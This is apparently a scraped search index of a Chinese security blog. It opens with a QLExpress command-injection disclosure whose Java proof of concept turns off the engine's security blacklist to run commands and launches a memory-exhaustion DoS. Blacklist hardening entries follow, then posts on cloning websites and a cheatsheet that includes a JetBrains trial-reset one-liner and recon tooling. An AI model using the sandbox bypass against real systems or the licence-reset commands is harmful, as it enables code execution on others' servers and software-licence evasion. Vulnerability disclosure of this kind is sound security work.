calculator.app\\\u0026#34;)\u0026#39;)\u0026#34;; // 利用QLExpressRunStrategy关闭黑名单 String payload3 = \u0026#34;import com.ql.util.express.config.QLExpressRunStrategy;QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(false);Runtime.getRuntime().exec(\\\u0026#34;open -a calculator.app\\\u0026#34;);\u0026#34;; runner.execute(payload3, new DefaultContext\u0026lt;\u0026gt;(), null, false, true); } } DoS\n1 2 3 4 5 6 7 8 9 10 11 public class Test2 { public static void main(String[] args) throws Exception { // 开启白名单，并指定使用特定安全方法 QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true); QLExpressRunStrategy.addSecureMethod(RiskBean.class, \u0026#34;secureMethod\u0026#34;); ExpressRunner runner = new ExpressRunner(); DefaultContext\u0026lt;String, Object\u0026gt; context = new DefaultContext\u0026lt;String, Object\u0026gt;(); String code = \u0026#34;byte[] bytes = new byte[2147483645];for (i=0;i\u0026lt;2147483645;i++) {new String(bytes);}\u0026#34;; runner.execute(code, new DefaultContext\u0026lt;\u0026gt;(), null, false, true); } } 加强黑名单列表\n1 2 3 4 SECURITY_RISK_METHOD_LIST.add(QLExpressRunStrategy.class.getName()+\u0026#34;.setForbidInvokeSecurityRiskMethods\u0026#34;); SECURITY_RISK_METHOD_LIST.add(\u0026#34;jdk.jshell.JShell.create\u0026#34;); SECURITY_RISK_METHOD_LIST.add(\u0026#34;javax.script.ScriptEngineManager.getEngineByName\u0026#34;); SECURITY_RISK_METHOD_LIST.add(\u0026#34;org.springframework.jndi.JndiLocatorDelegate.lookup\u0026#34;); 参考 QLExpress最新版本（3.3.1）默认不安全，存在命令注入 QLExpress-3.3.0-vuln-poc[BUG]\n","permalink":"https://ret2neo.cn/post/230628-qlexpress-command-inject/","summary":"QLExpress是什么 由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。\n——https://github.com/alibaba/QLExpress\n命令注入 由于 com.ql.util.express.config.QLExpressRunStrategy#forbidInvokeSecurityRiskMethods 默认为 false ，导致默认不安全，建议默认值改为 true 。\n按照 https://github.com/alibaba/QLExpress#1-黑名单控制 说明：\n但实际上并不是默认安全的，微调官方demo成为漏洞demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.neo.el; import com.ql.util.express.DefaultContext; import com.ql.util.express.ExpressRunner; public class qlexpress { public static void main(String[] args) throws Exception { ExpressRunner runner = new ExpressRunner(); DefaultContext\u0026lt;String, Object\u0026gt; context = new DefaultContext\u0026lt;String, Object\u0026gt;(); context.put(\u0026#34;a\u0026#34;, 1); context.put(\u0026#34;b\u0026#34;, 2); context.put(\u0026#34;c\u0026#34;, 3); String express = \u0026#34;a + b * c\u0026#34;; express=\u0026#34;java.","title":"QLExpress最新版本（3.3.1）默认不安全，存在命令注入"},{"content":"想要整站克隆某个站点，有一些已有的工具。\nWGET 参考这篇文章（ Make Offline Mirror of a Site using wget ） ，克隆网站可以直接使用wet命令\n1 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.org 短命令\n1 wget -mkEpnp http://example.org 效果还可以，中文编码处理可能会有点问题。\nwebhttrack 1 2 apt-get install -y webhttrack 主导Windows平台，Linux平台运行直接报错了，没有继续尝试 httrack https://www.kali.org/tools/httrack/\n1 2 apt install httrack httrack http://140.143.242.46/ 不会自己新建目录，所以要进入到要存放站点的文件夹下，再运行。\nGitHub action 用法：在github repo根目录下编辑 urls.txt 文件，格式为\n1 2 [URL] [dir name] [comment] https://www.yinwang.org/ www.yinwang.org 王垠博客：当然我在扯淡 会以 www.yinwang.org 为目录克隆 https://www.yinwang.org/ 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 name: clone site on: workflow_dispatch: push: branches: - master paths: - \u0026#39;**/urls.txt\u0026#39; jobs: build: runs-on: ubuntu-latest steps: - name: do the work run: | set -ex echo \u0026#34;### setting up git repo and pushing change... ###\u0026#34; pwd ls -lhA sudo timedatectl set-timezone \u0026#34;Asia/Shanghai\u0026#34; mkdir -p ~/.ssh/ echo \u0026#34;${{ secrets.SITECOPY }}\u0026#34; \u0026gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com \u0026gt;\u0026gt; ~/.ssh/known_hosts git config --global user.email \u0026#34;ci@github.io\u0026#34; git config --global user.name \u0026#34;ci\u0026#34; git clone git@github.com:findneo/sitecopy.git cd sitecopy echo \u0026#34;### cloning website ... ###\u0026#34; #sudo apt install -y wget #wget --mirror --convert-links --adjust-extension --page-requisites --no-parent $(tail -n1 urls.txt|cut -d \u0026#34; \u0026#34; -f1) \u0026gt;res.txt sudo apt update -y sudo apt install -y httrack mkdir $(tail -n1 urls.txt|cut -d \u0026#34; \u0026#34; -f2) cd $(tail -n1 urls.txt|cut -d \u0026#34; \u0026#34; -f2) httrack $(tail -n1 ../urls.txt|cut -d \u0026#34; \u0026#34; -f1) cd .. echo \u0026#34;### cloning website done ###\u0026#34; echo \u0026#34;### push changes ###\u0026#34; git add -A git commit -m \u0026#34;update site\u0026#34; --allow-empty git push rm -rf ~/.ssh/ ","permalink":"https://ret2neo.cn/post/230602-save-web-using-github-action/","summary":"想要整站克隆某个站点，有一些已有的工具。\nWGET 参考这篇文章（ Make Offline Mirror of a Site using wget ） ，克隆网站可以直接使用wet命令\n1 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.org 短命令\n1 wget -mkEpnp http://example.org 效果还可以，中文编码处理可能会有点问题。\nwebhttrack 1 2 apt-get install -y webhttrack 主导Windows平台，Linux平台运行直接报错了，没有继续尝试 httrack https://www.kali.org/tools/httrack/\n1 2 apt install httrack httrack http://140.143.242.46/ 不会自己新建目录，所以要进入到要存放站点的文件夹下，再运行。\nGitHub action 用法：在github repo根目录下编辑 urls.txt 文件，格式为\n1 2 [URL] [dir name] [comment] https://www.yinwang.org/ www.yinwang.org 王垠博客：当然我在扯淡 会以 www.yinwang.org 为目录克隆 https://www.yinwang.org/ 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 name: clone site on: workflow_dispatch: push: branches: - master paths: - \u0026#39;**/urls.","title":"使用GitHub Action方便地整站克隆"},{"content":"近来我很开心，不再常常觉得难过。\n许多问题仍然无解，但于我已无妨。\n愿生而自由，爱而无畏，活成自己。\n挑选一些近半年的碎片\n大连 内蒙 揭阳 武汉 北京 南澳岛 广州 顺德 故乡 sofun 红树湾 周末 嶂顶 ","permalink":"https://ret2neo.cn/mind/230530-25th/","summary":"近来我很开心，不再常常觉得难过。\n许多问题仍然无解，但于我已无妨。\n愿生而自由，爱而无畏，活成自己。\n挑选一些近半年的碎片\n大连 内蒙 揭阳 武汉 北京 南澳岛 广州 顺德 故乡 sofun 红树湾 周末 嶂顶 ","title":"25th"},{"content":"burpsuite scope 排除的scope\n1 .*\\.(huawei|vmall|google|googleapis|gvt2|gstatic|googleusercontent|google-analytics|baidu|wappalyzer)\\.com 隐藏的ext\n1 woff,woff2,gif,jpg,png,svg,jpeg,css,ico,ttf,mp3,mp4,webm linux crontab的使用 参考 https://askubuntu.com/a/216711 ，每个用户有自己的crontab，如bob用户的位于 /var/spoll/cron/crontabs/bob ，但是不建议直接编辑该文件。而应该通过crontab -e来编辑。 也可以用crontab -l \u0026gt; backup ，然后编辑backup文件，再 crontab backup 来导入，就会和 crontab -e 编辑执行一样的语法检查。\nbash命令、语法和脚本编写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ############################################################## ### Linux是伟大的发明，尝试用golang实现bash的功能是浪费生命。 ### ############################################################## #-------------------------------------------------------------# # 算数表达式 $((123 + 1)) #-------------------------------------------------------------# # 删除字符串的某个子字符串 tr -d \u0026#39;\\r\\n\u0026#39; #-------------------------------------------------------------# # 如果用alias，右侧命令用单引号包裹，免得出现奇怪的问题。 #-------------------------------------------------------------# # alias无法传参，需传参的场景优先用function，function中使用$1指代传入的第一个参数 #-------------------------------------------------------------# # screen中如何创建日志？ 按 CTRL + A + H 创建日志文件。需要注意，A 和 H 都是大写。 #-------------------------------------------------------------# # 添加用户sd，并且添加家目录 useradd sd -m # 把sd添加到sudo组 usermod -aG sudo sd # 删除用户，包括home目录，强制删除 userdel -rf sd #-------------------------------------------------------------# # parallel 安装与使用 sudo apt install parallel cat \u0026lt;file-name\u0026gt; | parallel -j 200 curl -L -o /dev/null {} -x 127.0.0.1:8080 -k -s #-------------------------------------------------------------# # grep打印文件差集 # 打印出FB独有的行 grep -Fxvf fA fB # -F 将模式当作是字符串，而不是正则表达式 # -x 只显示匹配的整行，相当于给正则加^...$ # -v 反向选择 如果是grep -Fxf fA fB则是显示既出现在fA中也出现在fB中行，即两者交集 # -f 将fA的每一行当作正则 #-------------------------------------------------------------# # comm 专业比较文件（需要文件排好序） # -1 不输出fA独有的 # -2 不输出fB独有的 # -3 不输出公共的 # 输出FB独有的行 comm -13 fA fB # 输出FA独有的行 comm -23 fA fB # 输出公共的行 comm -12 fA fB #-------------------------------------------------------------# # find技巧：找到并删除空文件夹 find /dir -type d -empty -delete #-------------------------------------------------------------# # 适用于 cmder上面执行，要有wsl # idea 全家桶白嫖 wsl -d ubuntu bash -c \u0026#34;find /mnt/c/Users/*/AppData/Roaming/JetBrains -name *.evaluation.key |xargs -i mv {} {}.bak.$(date +%s)\u0026#34; wsl -d ubuntu bash -c \u0026#34;find /mnt/c/Users/*/AppData/Roaming/JetBrains -name other.xml |xargs -i mv {} {}.bak.$(date +%s)\u0026#34; reg delete hkcu\\SOFTWARE\\JavaSoft\\Prefs\\jetbrains /f #-------------------------------------------------------------# # hex decode echo 54657374696e672031203220330 | xxd -r -p #-------------------------------------------------------------# 一键apt install常用工具 1 sudo apt-get install -y git wget curl proxychains4 libpcap-dev build-essential ripgrep parallel dnsutils make jq xsel parallel useful alias 1 2 alias pbcopy=\u0026#39;xsel --clipboard --input\u0026#39; alias pbpaste=\u0026#39;xsel --clipboard --output\u0026#39; wsl alias ~/.automan/automan.bashrc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # add golang env export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin # custome alias alias yupdate_custom_alias=\u0026#39;source ~/.automan/automan.bashrc\u0026#39; alias rm=\u0026#39;rm -i \u0026#39; # cd ~ #service cron start \u0026gt;/dev/null alias pc=\u0026#39;proxychains4 -q\u0026#39; alias wakepy=\u0026#39;conda activate d\u0026#39; alias sleppy=\u0026#39;conda deactivate\u0026#39; alias startwiki=\u0026#34;ruby /mnt/d/typote/note/tiddly/tw5.rb \u0026amp;\u0026#34; alias pbcopy=\u0026#34;tee \u0026lt;\u0026amp;0 | clip.exe\u0026#34; alias pbcopyz=\u0026#34;tee \u0026lt;\u0026amp;0 | sed -rz \u0026#39;s/\\s*$//g\u0026#39; | clip.exe\u0026#34; # 去除trailing的换行或空白符等 # refer: https://www.techtronic.us/pbcopy-pbpaste-for-wsl/ alias pbpaste=\u0026#34;powershell.exe Get-Clipboard | sed \u0026#39;s/\\r$//\u0026#39; | sed -z \u0026#39;$ s/\\n$//\u0026#39;\u0026#34; alias fmtjs=\u0026#34;~/.automan/fmtjs.sh\u0026#34; # gf的补全提示 complete -W \u0026#34;\\$(gf -list)\u0026#34; gf # bash 自动补全 bind \u0026#39;\u0026#34;\\e[A\u0026#34;: history-search-backward\u0026#39; bind \u0026#39;\u0026#34;\\e[B\u0026#34;: history-search-forward\u0026#39; git 1 git add -A 和 git add -a 是不同的。前者会包含新增的文件，后者只包含修改和删除的文件。git add -A 等价于 git add . 加上 git add -u 。 Debug 缓冲区问题 程序打印出问题的时候很多时候是输出的缓冲区导致的\nC 语言输出无缓存 1 2 3 setbuf(stdout, NULL); //或者 fflush(stdout); python 输出无缓存 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 方法一：执行脚本时添加参数 python -u script.py 方法二：python\u0026gt;3.3 可以使用 print(123,flush=True) 方法三： 全局改写 print（https://stackoverflow.com/a/35467658/15103280） import functools print = functools.partial(print, flush=True) 方法四： 重新打开 stdout （https://stackoverflow.com/a/9462099/15103280） sys.stdout = os.fdopen(sys.stdout.fileno(), \u0026#39;w\u0026#39;, 0) 方法五： 设置环境变量。PYTHONUNBUFFERED 设为非空时等价于-u 参数 Linux or OSX: $ export PYTHONUNBUFFERED=TRUE Windows: C:\\SET PYTHONUNBUFFERED=TRUE 方法六： 在代码中手动设置环境变量 os.environ[\u0026#39;PYTHONUNBUFFERED\u0026#39;]=\u0026#34;TRUE\u0026#34; golang 输出无缓存 1 2 bob@pb:/mnt/d/gitrepo/automan/hissl$ head yy_22_open_port.txt | GOCACHE=off go run hissh.go 2\u0026gt;\u0026amp;1 |tee -a res build cache is disabled by GOCACHE=off, but required as of Go 1.12 工具安装 1 2 3 4 5 6 7 8 go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest go install -v github.com/projectdiscovery/katana/cmd/katana@latest go install -v github.com/tomnomnom/gf@latest go install -v github.com/tomnomnom/anew@latest go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest pd命令 1 cat domain | httpx -x ALL -follow-redirects -threads 100 -cdn -content-type -cname -status-code -vhost -web-server -websocket -no-color -title --tls-probe -srd httpx.out -sr | tee -a httpx.log 可复用/有用的代码段 python request库使用 1 2 import urllib3 urllib3.disable_warnings() 获取当前时间 1 2 import time print(time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;)) python3错误和捕获 1 2 3 4 try: dosomething() except Exception as e: pass bash 批量格式化srgs收集到的JavaScript文件：fmtjs.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 cd ~ home=\u0026#34;/home/bob\u0026#34; statfile=$home\u0026#34;/.automan/dbs/burpjs/jsbeautify.done\u0026#34; sdb=\u0026#34;/mnt/d/record/burphttp/sitedb/\u0026#34; printf \u0026#34;formatted js number:\\t\u0026#34; wc -l $statfile | cut -d \u0026#34; \u0026#34; -f 1 printf \u0026#34;new js number:\\t\u0026#34; echo $(find $sdb -type f -name \u0026#34;*.js\u0026#34; | sort -u | comm -23 - $statfile|wc -l) printf \u0026#34;formating...\u0026#34; newfiles=$(find $sdb -type f -name \u0026#34;*.js\u0026#34; | sort -u | comm -23 - $statfile | tr \u0026#39;\\n\u0026#39; \u0026#39;\\0\u0026#39; | parallel -0 -j8 -I% js-beautify -r % ) echo $(echo \u0026#34;${newfiles}\u0026#34; | grep -P \u0026#34;^beautified\u0026#34; |wc -l)\u0026#34; done\u0026#34; # grep -Po \u0026#34;$sdb.*\\.js$\u0026#34; 是为了解决js-beautify输出结果可能是相对路径的问题，通过正则提取一次获取绝对路径 echo \u0026#34;${newfiles}\u0026#34; | grep -P \u0026#34;^beautified\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2 | grep -Po \u0026#34;$sdb.*\\.js$\u0026#34; | sort -u \u0026gt;\u0026gt; $statfile sort -uo $statfile $statfile echo \u0026#34;merged statefile\u0026#34; printf \u0026#34;formatted js number:\\t\u0026#34; wc -l $statfile | cut -d \u0026#34; \u0026#34; -f 1 cd - Java 输出到剪贴板 1 2 3 4 5 6 7 8 9 10 import java.awt.*; import java.awt.datatransfer.Clipboard; import java.awt.datatransfer.StringSelection; import java.awt.datatransfer.Transferable; public static void writeTextToClipboard(String s) { Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard(); Transferable transferable = new StringSelection(s); clipboard.setContents(transferable, null); } 序列化和反序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // https://gist.github.com/andy722/1524968 public static \u0026lt;T extends Serializable\u0026gt; String serialize(T item) { final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); final ObjectOutputStream objectOutputStream; try { objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(item); objectOutputStream.close(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); } catch (IOException e) { throw new Error(e); } } public static \u0026lt;T extends Serializable\u0026gt; T deserialize(String data) { try { // byte[] dataBytes = Base64.decode(data, Base64.DEFAULT); byte[] dataBytes = Base64.getDecoder().decode(data); final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(dataBytes); final ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); @SuppressWarnings({\u0026#34;unchecked\u0026#34;}) final T obj = (T) objectInputStream.readObject(); objectInputStream.close(); return obj; } catch (IOException e) { throw new Error(e); } catch (ClassNotFoundException e) { throw new Error(e); } } golang common 1 2 // convert byte to string myString := string(myBytes) golang命令行程序模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 package main import ( \u0026#34;bufio\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;sync\u0026#34; ) //https://manytools.org/hacker-tools/ascii-banner/ // Rounded font const banner = `` const common_usage = `ishttp: check if a port is http/https in minimal effort echo qq.com | ishttp` type Options struct { threadNum int InputFile string OutputFile string help bool timeout int } var options = \u0026amp;Options{} const symbol_for_os_stdin = \u0026#34;os.Stdin\u0026#34; func main() { initprog() doSth() } func initprog() { flag.IntVar(\u0026amp;options.threadNum,\u0026#34;t\u0026#34;,30,\u0026#34;线程数\u0026#34;) flag.IntVar(\u0026amp;options.timeout,\u0026#34;w\u0026#34;,5,\u0026#34;每次请求默认超时时间\u0026#34;) flag.BoolVar(\u0026amp;options.help,\u0026#34;h\u0026#34;,false,\u0026#34;打印帮助\u0026#34;) flag.StringVar(\u0026amp;options.InputFile,\u0026#34;iL\u0026#34;,symbol_for_os_stdin,\u0026#34;输入文件\u0026#34;) flag.StringVar(\u0026amp;options.OutputFile,\u0026#34;o\u0026#34;,\u0026#34;os.Stdout\u0026#34;,\u0026#34;输出文件(当前不支持自定义此选项)\u0026#34;) flag.Usage = func() { fmt.Fprintln(os.Stderr, banner) flag.PrintDefaults() fmt.Fprintln(os.Stderr, common_usage) } flag.Parse() if (options.InputFile==symbol_for_os_stdin \u0026amp;\u0026amp; !hasStdin()) || options.help{ flag.Usage() os.Exit(0) } } func hasStdin() bool { //https://stackoverflow.com/questions/22563616/determine-if-stdin-has-data-with-go fi, err := os.Stdin.Stat() if err != nil { panic(err) } return fi.Mode()\u0026amp;os.ModeNamedPipe != 0 } func throwErr(errdesc string, err error) { fmt.Fprintln(os.Stderr, strings.Repeat(\u0026#34;-\u0026#34;, 50)) fmt.Fprintln(os.Stderr, errdesc) if err != nil { fmt.Fprintln(os.Stderr, err.Error()) } fmt.Fprintln(os.Stderr, strings.Repeat(\u0026#34;-\u0026#34;, 50)) } func doSth() { //读取输入 var inputScanner *bufio.Scanner var finput io.Reader if options.InputFile==symbol_for_os_stdin { finput = os.Stdin } else { var err error finput,err = os.Open(options.InputFile) if err!=nil{ throwErr(\u0026#34;打开输入文件失败\u0026#34;,err) } } inputScanner = bufio.NewScanner(finput) var wg sync.WaitGroup var ch = make(chan struct{}, options.threadNum) for inputScanner.Scan() { entry := inputScanner.Text() wg.Add(1) ch \u0026lt;- struct{}{} // acquire a token go func(single_entry string) { defer wg.Done() doSthUnit(single_entry) \u0026lt;-ch // release the token }(entry) } wg.Wait() } func doSthUnit(entry string) { fmt.Fprintln(os.Stdout, entry) } others bash命令 工作时间统计\n1 pbpaste | grep -Po \u0026#34;\\d+(?=min)\u0026#34; | tr \u0026#39;\\n\u0026#39; \u0026#39;+\u0026#39;|rev|cut -c2-|rev|bc 工具推荐：APP合规扫描 1 2 3 https://github.com/zhengjim/camille 基于Frida的Android App隐私合规检测辅助工具 https://github.com/bytedance/appshark Appshark is a static taint analysis platform to scan vulnerabilities in an Android app. https://github.com/allenymt/PrivacySentry 工信部-Android隐私合规整改检测工具，注解+Asm修改字节码的检测方案 nmap top services 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # https://svn.nmap.org/nmap/nmap-services # https://security.stackexchange.com/questions/78618/is-there-a-nmap-command-to-get-the-top-most-common-ports # 所有常用端口 bob@pb:~$ cat /usr/share/nmap/nmap-services | grep -Pv \u0026#34;^#\u0026#34; | sort -rk3 | head http 80/tcp 0.484143 # World Wide Web HTTP ipp 631/udp 0.450281 # Internet Printing Protocol snmp 161/udp 0.433467 # Simple Net Mgmt Proto netbios-ns 137/udp 0.365163 # NETBIOS Name Service ntp 123/udp 0.330879 # Network Time Protocol netbios-dgm 138/udp 0.297830 # NETBIOS Datagram Service ms-sql-m 1434/udp 0.293184 # Microsoft-SQL-Monitor microsoft-ds 445/udp 0.253118 msrpc 135/udp 0.244452 # Microsoft RPC services dhcps 67/udp 0.228010 # DHCP/Bootstrap Protocol Server # 协议类型 # 其中SCTP比较神奇，值得单独研究一下：https://blog.csdn.net/wuxing26jiayou/article/details/79743683 bob@pb:~$ cat /usr/share/nmap/nmap-services | grep -Pv \u0026#34;^#\u0026#34; | sort -rk3 | cut -f2 | cut -d/ -f2 |sort -u sctp tcp udp # top100 不管协议 $ cat /usr/share/nmap/nmap-services | grep -Pv \u0026#34;^#\u0026#34; | sort -rk3 | cut -f2 | cut -d/ -f1 | head -n100 | tr \u0026#39;\\n\u0026#39; , # top tcp协议 bob@pb:~$ cat /usr/share/nmap/nmap-services | grep -Pv \u0026#34;^#\u0026#34; | sort -rk3 | cut -f2 | grep tcp | cut -d/ -f1 |wc 8320 8320 42421 # top udp协议 bob@pb:~$ cat /usr/share/nmap/nmap-services | grep -Pv \u0026#34;^#\u0026#34; | sort -rk3 | cut -f2 | grep udp | cut -d/ -f1 |wc 19022 19022 107028 科学上网参考 https://github.com/emptysuns/Hi_Hysteria\nupdate ","permalink":"https://ret2neo.cn/post/230512-cheatsheet/","summary":"burpsuite scope 排除的scope\n1 .*\\.(huawei|vmall|google|googleapis|gvt2|gstatic|googleusercontent|google-analytics|baidu|wappalyzer)\\.com 隐藏的ext\n1 woff,woff2,gif,jpg,png,svg,jpeg,css,ico,ttf,mp3,mp4,webm linux crontab的使用 参考 https://askubuntu.com/a/216711 ，每个用户有自己的crontab，如bob用户的位于 /var/spoll/cron/crontabs/bob ，但是不建议直接编辑该文件。而应该通过crontab -e来编辑。 也可以用crontab -l \u0026gt; backup ，然后编辑backup文件，再 crontab backup 来导入，就会和 crontab -e 编辑执行一样的语法检查。\nbash命令、语法和脚本编写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ############################################################## ### Linux是伟大的发明，尝试用golang实现bash的功能是浪费生命。 ### ############################################################## #-------------------------------------------------------------# # 算数表达式 $((123 + 1)) #-------------------------------------------------------------# # 删除字符串的某个子字符串 tr -d \u0026#39;\\r\\n\u0026#39; #-------------------------------------------------------------# # 如果用alias，右侧命令用单引号包裹，免得出现奇怪的问题。 #-------------------------------------------------------------# # alias无法传参，需传参的场景优先用function，function中使用$1指代传入的第一个参数 #-------------------------------------------------------------# # screen中如何创建日志？ 按 CTRL + A + H 创建日志文件。需要注意，A 和 H 都是大写。 #-------------------------------------------------------------# # 添加用户sd，并且添加家目录 useradd sd -m # 把sd添加到sudo组 usermod -aG sudo sd # 删除用户，包括home目录，强制删除 userdel -rf sd #-------------------------------------------------------------# # parallel 安装与使用 sudo apt install parallel cat \u0026lt;file-name\u0026gt; | parallel -j 200 curl -L -o /dev/null {} -x 127.","title":"Cheatsheet"},{"content":"很长一段时间，我的博客是用的hexo，也用博客记录过 搭建过程 ，但有几个不太舒服的地方\n一是依赖过重，每次在一台新电脑上安装node+npm+hexo环境都会出现一些新问题 二是构建速度比较慢 这次尝试用hugo+PaperMod主题+github action搭建一个新的博客，保持简洁的风格，同时能够利用CI自动构建，此后写博客所做的事情只是新建和编辑markdown文件，push到git仓库就可以了。\n此外增强了PaperMod的搜索功能，目前还算满意。\n放两张新旧博客界面的截图，作为纪念。\nPaperMod配置和魔改 自定义html/js/css 可以在网站根目录下相应目录建立文件，构建时会被merge，并且优先级高于papermod的对应文件，就可以在不更改原有主题的前提下起到覆盖和增加主题文件的效果了。\n比如我这里自定义了 blank.css/fastsearch.js/list.html/toc.html 这几个文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ ls -lhR assets/css/extended/ assets/js/ layouts/ themes/hugo-PaperMod-7.0/assets/css/extended/ themes/hugo-PaperMod-7.0/assets/js/ themes/hugo-PaperMod-7.0/layouts/partials/toc.html -rwxrwxrwx 1 bob bob 4.3K Feb 12 14:53 themes/hugo-PaperMod-7.0/layouts/partials/toc.html assets/css/extended/: total 4.0K -rwxrwxrwx 1 bob bob 1.9K May 10 09:15 blank.css assets/js/: total 12K -rwxrwxrwx 1 bob bob 9.4K May 9 23:49 fastsearch.js layouts/: total 4.0K -rwxrwxrwx 1 bob bob 815 May 9 16:08 list.html drwxrwxrwx 1 bob bob 4.0K May 10 09:12 partials layouts/partials: total 8.0K -rwxrwxrwx 1 bob bob 7.3K May 10 09:26 toc.html themes/hugo-PaperMod-7.0/assets/css/extended/: total 0 -rwxrwxrwx 1 bob bob 239 Feb 12 14:53 blank.css themes/hugo-PaperMod-7.0/assets/js/: total 124K -rwxrwxrwx 1 bob bob 5.5K Feb 12 14:53 fastsearch.js -rwxrwxrwx 1 bob bob 15K Feb 12 14:53 fuse.basic.min.js -rwxrwxrwx 1 bob bob 100K Feb 12 14:53 highlight.min.js -rwxrwxrwx 1 bob bob 192 Feb 12 14:53 license.js 修改目录位置到侧边栏 toc.html 添加文件 \\blog\\layouts\\partials\\toc.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 {{- $headers := findRE \u0026#34;\u0026lt;h[1-6].*?\u0026gt;(.|\\n])+?\u0026lt;/h[1-6]\u0026gt;\u0026#34; .Content -}} {{- $has_headers := ge (len $headers) 1 -}} {{- if $has_headers -}} \u0026lt;aside id=\u0026#34;toc-container\u0026#34; class=\u0026#34;toc-container wide\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;toc\u0026#34;\u0026gt; \u0026lt;details {{if (.Param \u0026#34;TocOpen\u0026#34;) }} open{{ end }}\u0026gt; \u0026lt;summary accesskey=\u0026#34;c\u0026#34; title=\u0026#34;(Alt + C)\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;details\u0026#34;\u0026gt;{{- i18n \u0026#34;toc\u0026#34; | default \u0026#34;Table of Contents\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/summary\u0026gt; \u0026lt;div class=\u0026#34;inner\u0026#34;\u0026gt; {{- $largest := 6 -}} {{- range $headers -}} {{- $headerLevel := index (findRE \u0026#34;[1-6]\u0026#34; . 1) 0 -}} {{- $headerLevel := len (seq $headerLevel) -}} {{- if lt $headerLevel $largest -}} {{- $largest = $headerLevel -}} {{- end -}} {{- end -}} {{- $firstHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers 0) 1) 0)) -}} {{- $.Scratch.Set \u0026#34;bareul\u0026#34; slice -}} \u0026lt;ul\u0026gt; {{- range seq (sub $firstHeaderLevel $largest) -}} \u0026lt;ul\u0026gt; {{- $.Scratch.Add \u0026#34;bareul\u0026#34; (sub (add $largest .) 1) -}} {{- end -}} {{- range $i, $header := $headers -}} {{- $headerLevel := index (findRE \u0026#34;[1-6]\u0026#34; . 1) 0 -}} {{- $headerLevel := len (seq $headerLevel) -}} {{/* get id=\u0026#34;xyz\u0026#34; */}} {{- $id := index (findRE \u0026#34;(id=\\\u0026#34;(.*?)\\\u0026#34;)\u0026#34; $header 9) 0 }} {{- /* strip id=\u0026#34;\u0026#34; to leave xyz, no way to get regex capturing groups in hugo */ 